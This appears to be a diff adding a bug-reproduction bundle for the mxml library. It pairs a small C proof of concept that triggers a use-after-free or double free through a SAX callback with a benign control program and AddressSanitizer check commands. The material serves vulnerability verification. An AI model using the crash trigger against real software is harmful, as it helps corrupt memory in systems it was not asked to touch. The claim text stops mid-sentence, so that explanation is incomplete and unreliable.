@@ -1,0 +1,18 @@
+{
+  "schema": "slopproof.bundle/v1",
+  "claim": "The bug is reproduced. The PoC calls mxmlLoadString with a SAX callback that returns false on MXML_SAX_EVENT_ELEMENT_CLOSE for the root element. This triggers the error path in mxml_load_data (mxml-file.c:1329-1333) where mxmlDelete(node) is called on the root node (which equals 'first'), then goto ",
+  "repo": "https://github.com/michaelrsweet/mxml",
+  "commit": "9d49b9082f3767647cf1ba48d1746c6a1e73ab39",
+  "sandbox_image": "sha256:588d82723bf640912b3a1d8655b8ba375dc9c36ddbc1e37a07e3353d141d580f",
+  "build": "true",
+  "files": {
+    "/work/poc.c": "#include <stdio.h>\n#include \"mxml.h\"\n\nstatic bool sax_cb(void *data, mxml_node_t *node, mxml_sax_event_t event)\n{\n  (void)data; (void)node;\n  return event != MXML_SAX_EVENT_ELEMENT_CLOSE;\n}\n\nint main(void)\n{\n  mxml_options_t *opts = mxmlOptionsNew();\n  mxmlOptionsSetSAXCallback(opts, sax_cb, NULL);\n  mxml_node_t *root = mxmlLoadString(NULL, opts, \"<a></a>\");\n  printf(\"root=%p\\n\", (void *)root);\n  mxmlOptionsDelete(opts);\n  return 0;\n}",
+    "/work/poc_safe.c": "#include <stdio.h>\n#include \"mxml.h\"\n\nstatic bool sax_cb(void *data, mxml_node_t *node, mxml_sax_event_t event)\n{\n  (void)data; (void)node;\n  return true;  // Safe: always return true\n}\n\nint main(void)\n{\n  mxml_options_t *opts = mxmlOptionsNew();\n  mxmlOptionsSetSAXCallback(opts, sax_cb, NULL);\n  mxml_node_t *root = mxmlLoadString(NULL, opts, \"<a></a>\");\n  printf(\"root=%p\\n\", (void *)root);\n  mxmlOptionsDelete(opts);\n  return 0;\n}"
+  },
+  "setup": "",
+  "check": "clang -fsanitize=address,undefined -g -I/work/repo -I/work/repo/linux -o /work/poc /work/poc.c /work/repo/mxml-file.c /work/repo/mxml-node.c /work/repo/mxml-options.c /work/repo/mxml-get.c /work/repo/mxml-attr.c /work/repo/mxml-search.c /work/repo/mxml-set.c /work/repo/mxml-index.c /work/repo/mxml-private.c 2>&1 && /work/poc 2>&1 | grep -q \"heap-use-after-free\\|double free\\|double-free\\|use-after-free\"",
+  "control": "clang -fsanitize=address,undefined -g -I/work/repo -I/work/repo/linux -o /work/poc_safe /work/poc_safe.c /work/repo/mxml-file.c /work/repo/mxml-node.c /work/repo/mxml-options.c /work/repo/mxml-get.c /work/repo/mxml-attr.c /work/repo/mxml-search.c /work/repo/mxml-set.c /work/repo/mxml-index.c /work/repo/mxml-private.c 2>&1 && /work/poc_safe 2>&1 | grep -q \"heap-use-after-free\\|double free\\|double-free\\|use-after-free\"",
+  "expect_output": null,
+  "created_at": "2026-10-28T10:29:21Z",
+  "sha256": "3e88f398ea9649622bb494d693008d6195f605d26fc4b650323dc1b7d36e82d5"
+}
